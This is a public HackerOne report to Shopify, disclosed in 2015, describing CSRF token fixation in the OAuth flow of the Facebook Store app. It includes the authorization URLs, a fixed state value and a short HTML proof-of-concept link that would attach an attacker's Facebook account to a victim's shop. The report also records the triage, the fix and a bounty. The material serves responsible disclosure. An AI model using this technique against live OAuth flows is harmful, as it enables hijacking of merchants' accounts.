{"id":55911,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81NTkxMQ==","url":"https://hackerone.com/reports/55911","title":"CSRF token fixation in facebook store app that can lead to adding attacker to victim acc ","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-04-11T14:06:20.330Z","submitted_at":"2015-04-11T14:06:20.330Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"defmax","url":"/defmax","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/759/d9f0b9418825e2418954f2cf260e32fe003c3593_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2015-06-25T20:05:05.521Z","bug_reporter_agreed_on_going_public_at":"2015-06-25T20:05:05.204Z","team_member_agreed_on_going_public_at":"2015-06-09T21:57:54.465Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"hey guys\r\n\r\ni just found  an csrf token  fixation in facebook store app  which is an offical  shopify app \r\n\r\nlink \u003e\u003e https://docs.shopify.com/manual/more/official-shopify-apps/facebook-store\r\n\r\n\r\nThe CSRF bug which connects attacker's Facebook account to victim's shopify  account. This is done by exploiting 'Connect with Facebook' function.\r\n\r\nWhen using 'Connect with Facebook' function. A request is sent to facebook to authorize the shopify app. After authorizing a 'access token' is sent in response which shopify app verifies and connects the account. the verification is done by csrf  token \"state parameter \" \r\n\r\nhere state parameter is getting fixed here \r\n\r\n1st oauth request \r\n\r\nhttps://graph.facebook.com/oauth/authorize?client_id=410312912374011\u0026display=popup\u0026redirect_uri=https%3A%2F%2Ffacebookstore.shopifyapps.com%2Fauthenticated\u0026response_type=code\u0026scope=manage_pages+email\u0026state=c2f449f2df5ee64df6173702846bce72e3a57319\r\n\r\nthen when it autorized , we will get this  get !\r\n\r\n\r\nhttps://facebookstore.shopifyapps.com/authenticated?code=AQDdi9hS-WHa-jnVj3Cm63b_gc68E6vjm6xxoalbiwX0fmWtH91HdRI6vjkg2TmjGGJZcmQI4hHO1J8PC_CF7z5-vmxxaXjQQtBadOiwuYGPUrvpmsP2OkVAjFiLUzYDwn6O778zSz6Hb4nYlsW5OUz0QrdQLMY8aWTXKZnywzpQPz-Xx1q9DU4_mFotq7IaYgSvmbWDPNeM05FY4XCEKYIVKtB0Jpx2_hHG9ft_xXcAfh8sKnNzeEkgWrcGfqXnH-_h2EYvCB57gB0qj6ec7O-5SUlo6B4qPq4HywEqYaPXO2yj0npE9BkAJWjwCWMbeTw\u0026state=c2f449f2df5ee64df6173702846bce72e3a57319#_=_\r\n\r\n\r\nnow how many times you  autorize the state parameter will be same !  once the attacker gets state parameter by xss or any method , he can make csrf lifelong posible \r\n\r\nexploit code \r\n\r\n```\r\n\u003chtml\u003e\r\n\u003cbody\u003e\r\n\u003ca href=https://facebookstore.shopifyapps.com/authenticated?code=[[attacker_token ]\u0026state=c2f449f2df5ee64df6173702846bce72e3a57319#_=_\u003e\r\n\u003c/body\u003e\r\n\u003c/html\u003e\r\n```\r\n\r\nhope this bug will be fixed soon","vulnerability_information_html":"\u003cp\u003ehey guys\u003c/p\u003e\n\n\u003cp\u003ei just found  an csrf token  fixation in facebook store app  which is an offical  shopify app \u003c/p\u003e\n\n\u003cp\u003elink \u0026gt;\u0026gt; \u003ca title=\"https://docs.shopify.com/manual/more/official-shopify-apps/facebook-store\" href=\"/redirect?url=https%3A%2F%2Fdocs.shopify.com%2Fmanual%2Fmore%2Fofficial-shopify-apps%2Ffacebook-store\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://docs.shopify.com/manual/more/official-shopify-apps/facebook-store\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe CSRF bug which connects attacker\u0026#39;s Facebook account to victim\u0026#39;s shopify  account. This is done by exploiting \u0026#39;Connect with Facebook\u0026#39; function.\u003c/p\u003e\n\n\u003cp\u003eWhen using \u0026#39;Connect with Facebook\u0026#39; function. A request is sent to facebook to authorize the shopify app. After authorizing a \u0026#39;access token\u0026#39; is sent in response which shopify app verifies and connects the account. the verification is done by csrf  token \u0026quot;state parameter \u0026quot; \u003c/p\u003e\n\n\u003cp\u003ehere state parameter is getting fixed here \u003c/p\u003e\n\n\u003cp\u003e1st oauth request \u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://graph.facebook.com/oauth/authorize?client_id=410312912374011\u0026amp;display=popup\u0026amp;redirect_uri=https%3A%2F%2Ffacebookstore.shopifyapps.com%2Fauthenticated\u0026amp;response_type=code\u0026amp;scope=manage_pages+email\u0026amp;state=c2f449f2df5ee64df6173702846bce72e3a57319\" href=\"/redirect?url=https%3A%2F%2Fgraph.facebook.com%2Foauth%2Fauthorize%3Fclient_id%3D410312912374011%26display%3Dpopup%26redirect_uri%3Dhttps%253A%252F%252Ffacebookstore.shopifyapps.com%252Fauthenticated%26response_type%3Dcode%26scope%3Dmanage_pages%2Bemail%26state%3Dc2f449f2df5ee64df6173702846bce72e3a57319\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://graph.facebook.com/oauth/authorize?client_id=410312912374011\u0026amp;display=popup\u0026amp;redirect_uri=https%3A%2F%2Ffacebookstore.shopifyapps.com%2Fauthenticated\u0026amp;response_type=code\u0026amp;scope=manage_pages+email\u0026amp;state=c2f449f2df5ee64df6173702846bce72e3a57319\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003ethen when it autorized , we will get this  get !\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://facebookstore.shopifyapps.com/authenticated?code=AQDdi9hS-WHa-jnVj3Cm63b_gc68E6vjm6xxoalbiwX0fmWtH91HdRI6vjkg2TmjGGJZcmQI4hHO1J8PC_CF7z5-vmxxaXjQQtBadOiwuYGPUrvpmsP2OkVAjFiLUzYDwn6O778zSz6Hb4nYlsW5OUz0QrdQLMY8aWTXKZnywzpQPz-Xx1q9DU4_mFotq7IaYgSvmbWDPNeM05FY4XCEKYIVKtB0Jpx2_hHG9ft_xXcAfh8sKnNzeEkgWrcGfqXnH-_h2EYvCB57gB0qj6ec7O-5SUlo6B4qPq4HywEqYaPXO2yj0npE9BkAJWjwCWMbeTw\u0026amp;state=c2f449f2df5ee64df6173702846bce72e3a57319#_=_\" href=\"/redirect?url=https%3A%2F%2Ffacebookstore.shopifyapps.com%2Fauthenticated%3Fcode%3DAQDdi9hS-WHa-jnVj3Cm63b_gc68E6vjm6xxoalbiwX0fmWtH91HdRI6vjkg2TmjGGJZcmQI4hHO1J8PC_CF7z5-vmxxaXjQQtBadOiwuYGPUrvpmsP2OkVAjFiLUzYDwn6O778zSz6Hb4nYlsW5OUz0QrdQLMY8aWTXKZnywzpQPz-Xx1q9DU4_mFotq7IaYgSvmbWDPNeM05FY4XCEKYIVKtB0Jpx2_hHG9ft_xXcAfh8sKnNzeEkgWrcGfqXnH-_h2EYvCB57gB0qj6ec7O-5SUlo6B4qPq4HywEqYaPXO2yj0npE9BkAJWjwCWMbeTw%26state%3Dc2f449f2df5ee64df6173702846bce72e3a57319%23_%3D_\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://facebookstore.shopifyapps.com/authenticated?code=AQDdi9hS-WHa-jnVj3Cm63b_gc68E6vjm6xxoalbiwX0fmWtH91HdRI6vjkg2TmjGGJZcmQI4hHO1J8PC_CF7z5-vmxxaXjQQtBadOiwuYGPUrvpmsP2OkVAjFiLUzYDwn6O778zSz6Hb4nYlsW5OUz0QrdQLMY8aWTXKZnywzpQPz-Xx1q9DU4_mFotq7IaYgSvmbWDPNeM05FY4XCEKYIVKtB0Jpx2_hHG9ft_xXcAfh8sKnNzeEkgWrcGfqXnH-_h2EYvCB57gB0qj6ec7O-5SUlo6B4qPq4HywEqYaPXO2yj0npE9BkAJWjwCWMbeTw\u0026amp;state=c2f449f2df5ee64df6173702846bce72e3a57319#_=_\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003enow how many times you  autorize the state parameter will be same !  once the attacker gets state parameter by xss or any method , he can make csrf lifelong posible \u003c/p\u003e\n\n\u003cp\u003eexploit code \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;a\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003ehttps://facebookstore.shopifyapps.com/authenticated?code=[[attacker_token\u003c/span\u003e \u003cspan class=\"err\"\u003e]\u0026amp;\u003c/span\u003e\u003cspan class=\"na\"\u003estate=\u003c/span\u003e\u003cspan class=\"s\"\u003ec2f449f2df5ee64df6173702846bce72e3a57319#_=_\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ehope this bug will be fixed soon\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":57,"name":"Violation of Secure Design Principles"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2015-07-09T21:57:54.672Z","allow_singular_disclosure_after":-172743744.27260205,"singular_disclosure_allowed":true,"vote_count":0,"voters":[],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":386515,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks, I managed to replicate the bug. Our team is investigating.","markdown_message":"\u003cp\u003eThanks, I managed to replicate the bug. Our team is investigating.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-04-21T16:38:00.405Z","updated_at":"2015-04-21T16:38:00.405Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":448261,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"This vulnerability has been fixed. Thanks for helping improve the security of Shopify!","markdown_message":"\u003cp\u003eThis vulnerability has been fixed. Thanks for helping improve the security of Shopify!\u003c/p\u003e\n","automated_response":false,"created_at":"2015-06-09T21:57:36.593Z","updated_at":"2015-06-09T21:57:36.593Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Shopify"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"defmax","url":"/defmax"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":448262,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2015-06-09T21:57:48.232Z","updated_at":"2015-06-09T21:57:48.232Z","actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"defmax","url":"/defmax"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":448264,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-06-09T21:57:54.499Z","updated_at":"2015-06-09T21:57:54.499Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":491930,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-06-25T20:05:05.248Z","updated_at":"2015-06-25T20:05:05.248Z","actor":{"username":"defmax","cleared":false,"url":"/defmax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/759/d9f0b9418825e2418954f2cf260e32fe003c3593_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":491931,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-06-25T20:05:05.553Z","updated_at":"2015-06-25T20:05:05.553Z","actor":{"username":"defmax","cleared":false,"url":"/defmax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/759/d9f0b9418825e2418954f2cf260e32fe003c3593_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":214,"category":"researcher","content":"haha sorry for the template @pranav_hivarekar:p ","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003ehaha sorry for the template \u003ca href=\"/pranav_hivarekar\"\u003e@pranav_hivarekar\u003c/a\u003e:p \u003c/p\u003e\n"}]}